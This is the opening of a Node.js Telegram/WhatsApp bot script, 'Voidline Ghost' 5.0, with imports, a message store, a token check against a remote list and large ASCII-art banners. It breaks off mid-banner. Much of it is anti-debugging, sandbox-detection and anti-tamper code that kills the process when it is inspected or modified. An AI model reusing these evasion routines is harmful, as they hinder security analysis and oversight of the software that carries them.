const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const FormData = require("form-data");
const yts = require("yt-search");
const fetch = require("node-fetch");
const AdmZip = require("adm-zip");
const https = require("https");

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    fetchLatestBaileysVersion,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('xatabail');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

try {
  if (
    typeof axios.get !== 'function' ||
    typeof axios.create !== 'function' ||
    typeof axios.interceptors !== 'object' ||
    !axios.defaults
  ) {
    console.error(`[SECURITY] Axios telah dimodifikasi`);
    process.exit(1);
  }
  if (
    axios.interceptors.request.handlers.length > 0 ||
    axios.interceptors.response.handlers.length > 0
  ) {
    console.error(`[SECURITY] Axios interceptor aktif (bypass terdeteksi)`);
    process.exit(1);
  }
  const env = process.env;
  if (
    env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
  ) {
    console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
    process.exit(1);
  }
  const execArgs = process.execArgv.join(' ');
  if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
    console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
    process.exit(1);
  }
  const realToString = Function.prototype.toString.toString();
  if (Function.prototype.toString.toString() !== realToString) {
    console.error(`[SECURITY] Function.toString dibajak`);
    process.exit(1);
  }
  const mod = require('module');
  const _load = mod._load.toString();
  if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
    console.error(`[SECURITY] Module._load telah dibajak`);
    process.exit(1);
  }
  setInterval(() => {
    if (process.exit.toString().includes("console.log") ||
        process.abort.toString().includes("console.log")) {
      console.error(`[SECURITY] Process function dibajak saat runtime`);
      process.exit(1);
    }
  }, 500);

} catch (err) {
  console.error(`[SECURITY] Proteksi gagal jalan:`, err);
  process.exit(1);
}


const databaseUrl = 'https://raw.githubusercontent.com/rizkyyy02xi-sudo/zarrnotdev/main/tokens.json';
const thumbnailUrl = "https://files.catbox.moe/linbl0.jpg";
const thumbnailUrl2 = "https://files.catbox.moe/unfg2r.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 50) {
      throw new Error(randErr());
    }
  }, 500);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

═══════════
═════════════════════
☇ Botname: Voidline Ghost 
☇ Version: 5.0
☇ Status: Bot Connected
═════════════════════
═══════════
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


═══════════
═════════════════════
Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
═════════════════════
═══════════
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

═══════════
═════════════════════
Perubahan kode terdeteksi, Harap membeli script kepada reseller
yang tersedia dan legal
═════════════════════
═══════════
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.red(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
